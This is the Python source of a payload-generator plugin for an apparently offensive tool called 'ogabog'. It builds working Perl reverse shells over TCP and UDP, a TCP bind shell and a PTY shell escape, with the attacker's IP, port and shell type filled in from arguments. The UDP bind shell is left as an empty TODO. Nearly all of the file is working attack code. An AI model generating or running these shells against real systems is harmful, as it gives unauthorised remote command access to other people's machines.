from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )

        self.opts.description = "[ReverseShell][TCP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        self.shell_type = "tcp"

    def make_shell(self):
        self.shell = f"""perl -e 'use Socket;$i="{self.args.ip}";$p={self.args.port};"""
        if self.shell_type == "udp":
            self.shell += """socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,"""
        else:
            self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,"""
        self.shell += """sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
        self.shell += f"""exec("{self.args.shell} -i");"""
        self.shell += """};'"""


class PTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[PTYShell] Perl PTY shell escape from https://netsec.ws/?p=337"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = "pty"

    def make_shell(self):
        self.shell = f"""perl -e 'exec "{self.args.shell}"'"""


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.shell_type = "udp"
        self.opts.description = "[ReverseShell][UDP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."


class BindTCP(plugin.BindShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.shell_type = "tcp"
        self.opts.description = "[BindShell][TCP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = f"perl -e 'use Socket;$p={self.args.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        self.shell += "bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){"
        self.shell += f"open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"{self.args.shell} -i\");"
        self.shell += "};'"


class BindUDP(BindTCP):
    def __init__(self):
        super().__init__()
        self.opts.description = "[BindShell][UDP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.shell_type = "udp"

    def make_shell(self):
        pass # TODO make bind shell UDP for Perl
